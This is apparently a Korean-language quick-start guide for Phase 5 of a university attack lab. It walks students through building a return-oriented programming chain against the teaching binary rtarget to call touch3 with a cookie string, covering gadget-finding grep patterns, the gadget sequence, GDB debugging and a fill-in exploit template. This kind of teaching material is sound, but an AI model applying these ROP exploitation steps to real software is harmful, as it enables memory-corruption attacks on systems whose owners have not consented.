# Phase 5 빠른 시작 가이드 ⚡

## 5분 안에 시작하기

### 1단계: 파일 준비 (1분)

```bash
# 서버 접속 및 파일 압축 해제
ssh username@server
tar xvf targetk.tar
cd targetk

# 디스어셈블
objdump -d rtarget > rtarget.d

# Cookie 확인
cat cookie.txt
# 예: 0x59b997fa
```

### 2단계: 가젯 찾기 (2분)

```bash
# 도구 사용 (권장)
python3 find_gadgets.py rtarget.d

# 또는 수동으로
grep "start_farm" rtarget.d  # 시작 위치
grep "end_farm" rtarget.d    # 끝 위치

# 필요한 가젯 바이트 패턴:
grep "48 89 e0" rtarget.d  # movq %rsp, %rax
grep "48 89 c7" rtarget.d  # movq %rax, %rdi
grep "58" rtarget.d        # popq %rax
grep "89 c2" rtarget.d     # movl %eax, %edx
grep "89 d1" rtarget.d     # movl %edx, %ecx
grep "89 ce" rtarget.d     # movl %ecx, %esi
grep "48 8d 04 37" rtarget.d  # lea (%rdi,%rsi,1),%rax

# touch3 주소
grep "<touch3>:" rtarget.d
```

### 3단계: Exploit 생성 (1분)

```bash
# 자동 생성 (권장)
python3 generate_exploit.py

# 정보 입력:
# - Cookie: (cookie.txt에서)
# - 버퍼 크기: 40
# - 가젯 주소들: (2단계에서 찾은 것)
# - touch3 주소: (2단계에서 찾은 것)
# - 오프셋: 72 (기본값)
```

### 4단계: 테스트 (1분)

```bash
# 변환
./hex2raw < exploit_phase5.txt > exploit_phase5_raw.txt

# 실행
./rtarget -i exploit_phase5_raw.txt

# 성공 메시지 확인:
# "Touch3!: You called touch3("59b997fa")"
# "PASSED"
```

---

## 안 되면? 🔧

### GDB로 디버깅

```bash
gdb rtarget
(gdb) break getbuf
(gdb) run < exploit_phase5_raw.txt
(gdb) stepi           # 한 단계씩
(gdb) x/40gx $rsp     # 스택 확인
(gdb) info registers  # 레지스터 확인
```

### 자주 발생하는 문제

#### 1. Segmentation Fault
→ 가젯 주소가 틀렸습니다. 다시 확인하세요.

```bash
# 가젯이 start_farm과 end_farm 사이에 있는지 확인
objdump -d rtarget | grep -A 100 start_farm | grep -B 100 end_farm
```

#### 2. Misfire (잘못된 문자열)
→ 오프셋이 틀렸습니다.

```bash
# GDB로 실제 오프셋 확인
(gdb) break touch3
(gdb) run < exploit_phase5_raw.txt
(gdb) x/s $rdi  # 어떤 문자열이 전달되었는지 확인
```

실제 문자열 위치를 찾으려면:
```bash
(gdb) break *0x401a06  # movq %rsp, %rax 가젯 주소
(gdb) run < exploit_phase5_raw.txt
(gdb) ni
(gdb) print/x $rax    # 스택 포인터 값
(gdb) x/100bx $rax    # 스택 내용 보기
# 문자열 바이트 찾기: 35 39 62 39 39 37 66 61 00
# 오프셋 = 문자열 주소 - $rax
```

#### 3. 가젯을 찾을 수 없음
→ 함수 중간에 숨어있을 수 있습니다.

예시:
```
400f15: c7 07 d4 48 89 c7  movl $0xc78948d4,(%rdi)
400f1b: c3                 retq
```

여기서 `48 89 c7 c3`를 추출하면:
- 주소: 0x400f15 + 3 = **0x400f18**
- 명령어: `movq %rax, %rdi; ret`

---

## 핵심 개념 정리 💡

### ROP 체인이 하는 일

```
1. movq %rsp, %rax      → 스택 주소를 %rax에 저장
2. movq %rax, %rdi      → %rdi에 복사 (백업)
3. popq %rax            → 오프셋 값을 %rax에 로드
4. movl %eax, %edx      → 32비트로 변환 (%edx)
5. movl %edx, %ecx      → %ecx로 이동
6. movl %ecx, %esi      → %esi로 이동
7. lea (%rdi,%rsi,1),%rax  → %rdi + %rsi = 문자열 주소
8. movq %rax, %rdi      → %rdi에 최종 주소 저장
9. ret to touch3        → touch3(%rdi) 호출
```

### 왜 이렇게 복잡한가?

- 직접 계산 불가 → 여러 단계로 분리
- 64비트 오프셋 → 32비트로 변환 필요 (`movl`의 zero-extension)
- 제한된 가젯 → 사용 가능한 가젯만으로 구성

### 리틀 엔디안 (중요!)

```
주소: 0x401234
Hex:  34 12 40 00 00 00 00 00
      ↑  ↑  ↑  (낮은 주소부터)
      낮은 바이트 먼저!
```

---

## 도구 요약

| 도구 | 용도 | 명령어 |
|------|------|--------|
| `find_gadgets.py` | 가젯 찾기 | `python3 find_gadgets.py rtarget.d` |
| `cookie_to_string.py` | Cookie 변환 | `python3 cookie_to_string.py 0x59b997fa` |
| `generate_exploit.py` | Exploit 생성 | `python3 generate_exploit.py` |
| `objdump` | 디스어셈블 | `objdump -d rtarget > rtarget.d` |
| `hex2raw` | Hex → Raw | `./hex2raw < exploit.txt > exploit_raw.txt` |
| `gdb` | 디버깅 | `gdb rtarget` |

---

## 최소한의 수동 작업

도구 없이도 할 수 있습니다:

### 1. Cookie 변환 (수동)

```python
cookie = "59b997fa"
for c in cookie:
    print(f"{ord(c):02x}", end=" ")
print("00")
# 출력: 35 39 62 39 39 37 66 61 00
```

### 2. 주소 변환 (수동)

```python
addr = 0x401234
for i in range(8):
    byte = (addr >> (i * 8)) & 0xff
    print(f"{byte:02x}", end=" ")
# 출력: 34 12 40 00 00 00 00 00
```

### 3. 가젯 찾기 (수동)

```bash
# start_farm과 end_farm 사이 내용 추출
sed -n '/start_farm/,/end_farm/p' rtarget.d > farm.txt

# 바이트 패턴 검색
grep "48 89 e0" farm.txt
grep "58.*c3" farm.txt
# ...
```

---

## 템플릿 (복사해서 사용)

```
/* Buffer */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* Gadgets */
XX XX XX XX XX XX XX XX  /* movq %rsp, %rax */
XX XX XX XX XX XX XX XX  /* movq %rax, %rdi */
XX XX XX XX XX XX XX XX  /* popq %rax */
48 00 00 00 00 00 00 00  /* offset (72) */
XX XX XX XX XX XX XX XX  /* movl %eax, %edx */
XX XX XX XX XX XX XX XX  /* movl %edx, %ecx */
XX XX XX XX XX XX XX XX  /* movl %ecx, %esi */
XX XX XX XX XX XX XX XX  /* lea */
XX XX XX XX XX XX XX XX  /* movq %rax, %rdi */

/* Target */
XX XX XX XX XX XX XX XX  /* touch3 */

/* String */
XX XX XX XX XX XX XX XX XX  /* cookie ASCII */
```

---

## 체크리스트 ✓

완료하기 전에:

- [ ] Cookie 값 확인했나?
- [ ] 가젯 8개 모두 찾았나?
- [ ] touch3 주소 확인했나?
- [ ] 모든 주소가 리틀 엔디안인가?
- [ ] Cookie를 ASCII로 변환했나?
- [ ] 0x0a가 포함되지 않았나?
- [ ] GDB로 테스트했나?

---

## 예상 소요 시간

| 단계 | 초보자 | 숙련자 |
|------|--------|--------|
| 파일 준비 | 5분 | 2분 |
| 가젯 찾기 | 20분 | 5분 |
| Exploit 작성 | 15분 | 3분 |
| 디버깅 | 30분 | 10분 |
| **총합** | **70분** | **20분** |

도구를 사용하면 시간을 크게 단축할 수 있습니다!

---

## 추가 도움

- 상세 가이드: `README_PHASE5.md`
- Phase 5 개념: `phase5_guide.md`
- GDB 명령어: `README_PHASE5.md` 의 "GDB 디버깅 팁" 섹션

**행운을 빕니다! 🚀**

